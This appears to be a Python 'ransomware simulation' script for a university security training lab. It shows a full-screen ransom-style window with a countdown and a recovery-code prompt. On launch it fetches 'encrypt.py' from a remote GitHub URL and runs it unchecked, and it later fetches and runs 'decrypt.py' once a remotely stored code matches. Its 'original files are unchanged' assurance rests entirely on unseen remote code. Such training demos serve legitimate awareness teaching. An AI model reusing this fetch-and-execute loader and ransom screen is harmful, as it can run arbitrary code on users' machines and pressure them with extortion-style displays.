from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError
from datetime import datetime, timedelta
import subprocess, sys, time, tkinter as tk

base = Path.home() / "Desktop" / "RansomDemo"
raw = "https://raw.githubusercontent.com/what0302/what0302.github.io/master/_posts/"
base.mkdir(parents=True, exist_ok=True)


def download(name, dest):
    req = Request(raw + name + "?t=" + str(time.time_ns()), headers={"User-Agent": "UNT-Training-Lab"})
    dest.parent.mkdir(parents=True, exist_ok=True)
    try:
        dest.write_bytes(urlopen(req, timeout=15).read())
    except HTTPError as e:
        raise RuntimeError(f"GitHub download failed ({e.code}): {name}") from e
    return dest


def run_code(name):
    return subprocess.run([sys.executable, str(download(name, base / ".runtime" / name))], text=True, capture_output=True)


try:
    result = run_code("encrypt.py")
    worked = result.returncode == 0
    detail = (result.stderr or result.stdout).strip()[-120:]
except Exception as e:
    worked, detail = False, str(e)

root = tk.Tk()
root.title("UNT Security Lab")
root.configure(bg="#8b0000")
root.attributes("-fullscreen", True)
root.bind("<Escape>", lambda e: root.destroy())

main = tk.Frame(root, bg="#8b0000")
main.pack(expand=True, padx=18, pady=12)

try:
    from PIL import Image, ImageTk
    imagefile = download("unt_mascot.png", base / ".runtime" / "unt_mascot.png")
    image = Image.open(imagefile).convert("RGBA")
    image.thumbnail((220, 330))
    photo = ImageTk.PhotoImage(image)
    left = tk.Label(main, image=photo, bg="#8b0000")
    left.image = photo
    left.pack(side="left", padx=(4, 18))
except Exception as e:
    print("Mascot:", e)

frame = tk.Frame(main, bg="#8b0000")
frame.pack(side="left", fill="both", expand=True)


def label(text, size=14, color="white"):
    w = tk.Label(frame, text=text, bg="#8b0000", fg=color, font=("Arial", size, "bold"), justify="center")
    w.pack(pady=5)
    return w


label("RANSOMWARE SIMULATION", 30)
label("ENCRYPTED PDF COPIES CREATED" if worked else "ENCRYPTION FAILED", 17, "#ffe600")
label("THIS IS A TEST. ORIGINAL FILES ARE UNCHANGED.", 10)

clock = tk.Label(frame, text="00:30:00", bg="#171717", fg="#ffe600", font=("Courier", 39, "bold"), padx=16, pady=8)
clock.pack(pady=10)
end = datetime.now() + timedelta(minutes=30)


def tick():
    s = max(0, int((end - datetime.now()).total_seconds()))
    clock.config(text=f"{s//3600:02}:{s//60%60:02}:{s%60:02}")
    if s:
        root.after(1000, tick)


tick()

tk.Button(frame, text="VIEW ENCRYPTED FILES", command=lambda: subprocess.Popen(["xdg-open", str(base / "critical_tk0667")]), padx=16, pady=6).pack(pady=8)
label("RECOVERY CODE", 12)
code = tk.Entry(frame, width=13, font=("Arial", 19), justify="center", show="*")
code.pack(pady=4)
status = label("" if worked else detail[:95], 10, "#ffe600")


def recover():
    entered = code.get().strip()
    if len(entered) != 4 or not entered.isdigit():
        status.config(text="ENTER A 4-DIGIT CODE")
        return
    try:
        expected = urlopen(Request(raw + "recovery_code.txt?t=" + str(time.time_ns()), headers={"Cache-Control": "no-cache"}), timeout=10).read().decode().strip()
        if entered != expected:
            status.config(text="INVALID RECOVERY CODE")
            return
        status.config(text="DOWNLOADING RECOVERY FILES...")
        root.update_idletasks()
        result = run_code("decrypt.py")
        if result.returncode:
            status.config(text="RECOVERY FAILED - CHECK TERMINAL")
        else:
            status.config(text="DECRYPTED / VERIFIED - SHA256 OK")
            subprocess.Popen(["xdg-open", str(base / "critical_tk0667")])
    except Exception as e:
        status.config(text=str(e)[:120])


btn = tk.Button(frame, text="RECOVER FILES", command=recover, padx=16, pady=7)
btn.pack(pady=8)
code.bind("<Return>", lambda e: recover())
if not worked:
    btn.config(state="disabled")
label("SIMULATION ONLY  •  ESC = Exit", 10)
root.mainloop()
